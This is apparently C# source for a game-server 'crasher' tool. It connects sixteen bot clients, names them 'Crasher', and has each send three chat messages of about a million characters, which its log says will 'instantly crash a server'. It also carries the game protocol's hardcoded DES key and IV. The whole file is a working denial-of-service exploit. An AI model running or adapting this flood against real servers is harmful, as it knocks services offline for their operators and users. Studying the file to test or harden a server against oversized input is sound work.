using System;
using System.Collections.Generic;
using global::System.IO;
using System.Linq;
using global::System.Net.Sockets;
using global::System.Security.Cryptography;
using global::System.Text;
using Microsoft.VisualBasic;
using System.Windows.Forms;

namespace ProjectTested
{
    public partial class Form1
    {
        internal static Form1 instance;
        public static Form1 getInstance()
        {
            return instance;
        }

        public Form1()
        {
            InitializeComponent();
            _Button1.Name = "Button1";
            _Button2.Name = "Button2";
            _Button3.Name = "Button3";
        }

        private List<GameClient> clients = new List<GameClient>();
        private Random rnd = new Random();

        private void Button1_Click(object sender, EventArgs e)
        {
            for (int i = 1; i <= 16; i++)
            {
                var c = new GameClient();
                c.Connect("127.0.0.1", 6575);
                clients.Add(c);
            }

            append("Connected new 16 clients.");
        }

        public void append(string a)
        {
            RichTextBox1.AppendText(a + Constants.vbCrLf);
            {
                var withBlock = RichTextBox1;
                withBlock.Select(withBlock.TextLength, 0);
                withBlock.ScrollToCaret();
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            foreach (var c in clients)
            {
                string n = "Crasher" + rnd.Next(1, 999999).ToString();
                c.Send($"setname?{n}");
                c.Name = n;
            }

            System.Threading.Thread.Sleep(10);
            foreach (var c in clients)
                c.Send($"world");
            System.Threading.Thread.Sleep(2000);
            foreach (var c in clients)
                c.Send($"chat?8023");
            append("Bots setup correctly.");
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            foreach (var c in clients)
                c.Send("chat?" + new string('x', 999999));
            foreach (var c in clients)
                c.Send("chat?" + new string('x', 999999));
            foreach (var c in clients)
                c.Send("chat?" + new string('x', 999999));
            append("All bots sent very long message to instantly crash a server.");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show(Convert.ToBase64String(Encoding.ASCII.GetBytes("ban tebe esli uznal etot kod")));
            append(Convert.ToBase64String(Encoding.ASCII.GetBytes("ban tebe esli uznal etot kod")));
            Clipboard.SetText(Convert.ToBase64String(Encoding.ASCII.GetBytes("ban tebe esli uznal etot kod")));

            CheckForIllegalCrossThreadCalls = false;
            instance = this;
        }
    }

    public class GameClient
    {
        public string Name { get; set; }

        private TcpClient client;
        private StreamWriter sWriter;

        public delegate void _xUpdate(string str);
        // 
        // '    '     If InvokeRequired Then
        // 
        // Else
        // '   '      TextBox3.AppendText(str & vbNewLine)
        // End If
        // End Sub
        public event OnPingCompleteEventHandler OnPingComplete;

        public delegate void OnPingCompleteEventHandler();

        private void Read(IAsyncResult ar)
        {
            try
            {
                string x = Encode.Decrypt(new StreamReader(client.GetStream()).ReadLine());
                Packet(x);
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, Read, null);
            }
            catch (Exception ex)
            {
                // Throw ex
                // xUpdate("You have disconnecting from server")
                // Exit Sub
                // MsgBox(ex.ToString)
            }
        }

        public void Packet(string x)
        {
            var a = x.Split('?');
            if (a[0] == "chat")
            {
                Form1.getInstance().append($"{Name}: [CHAT] > {string.Join("?", a.Skip(1).ToArray())}");
            }
        }

        public void Send(string str)
        {
            try
            {
                sWriter = new StreamWriter(client.GetStream());
                sWriter.WriteLine(Encode.Encrypt(str));
                sWriter.Flush();
            }
            catch (Exception ex)
            {
                // Throw ex
            }
        }
        /// <summary>
    /// Пытается подключиться к указанному серверу по указанному порту.
    /// </summary>
    /// <param name="ip">IP-адрес сервера</param>
    /// <param name="port">Порт сервера</param>

        public void Connect(string ip, int port)
        {
            try
            {
                client = new TcpClient(ip, port);
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(Read), null);
            }
            catch (Exception ex)
            {
                // Close()
            }
        }

        public void Disconnect()
        {
            client.Client.Close();
            client = null;
        }
    }

    public class Encode
    {
        private static byte[] key = new byte[] { 62, 59, 25, 19, 37 };
        private static readonly byte[] IV = new byte[] { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
        internal const string EncryptionKey = "81iSifdf"; // "HOMECLOUD" & New Random().Next(11111111, 99999999).ToString & New Random().Next(11111111, 99999999).ToString ' & New Random().Next(11111111, 99999999).ToString & New Random().Next(11111111, 99999999).ToString

        public static string Decrypt(string stringToDecrypt)
        {
            try
            {
                var inputByteArray = new byte[stringToDecrypt.Length + 1];
                key = Encoding.UTF8.GetBytes(Strings.Left(EncryptionKey, 8));
                var des = new DESCryptoServiceProvider();
                inputByteArray = Convert.FromBase64String(stringToDecrypt);
                var ms = new MemoryStream();
                var cs = new CryptoStream(ms, des.CreateDecryptor(key, IV), CryptoStreamMode.Write);
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                var encoding = Encoding.UTF8;
                return encoding.GetString(ms.ToArray());
            }
            catch (Exception ex)
            {
                // oops - add your exception logic
                // MsgBox("ошибка")
                return "";
            }
        }

        public static string Encrypt(string stringToEncrypt)
        {
            try
            {
                key = Encoding.UTF8.GetBytes(Strings.Left(EncryptionKey, 8));
                var des = new DESCryptoServiceProvider();
                var inputByteArray = Encoding.UTF8.GetBytes(stringToEncrypt);
                var ms = new MemoryStream();
                var cs = new CryptoStream(ms, des.CreateEncryptor(key, IV), CryptoStreamMode.Write);
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                return Convert.ToBase64String(ms.ToArray());
            }
            catch (Exception ex)
            {
                // oops - add your exception logic
                // MsgBox("ошибка")
                return "";
            }
        }
    }
}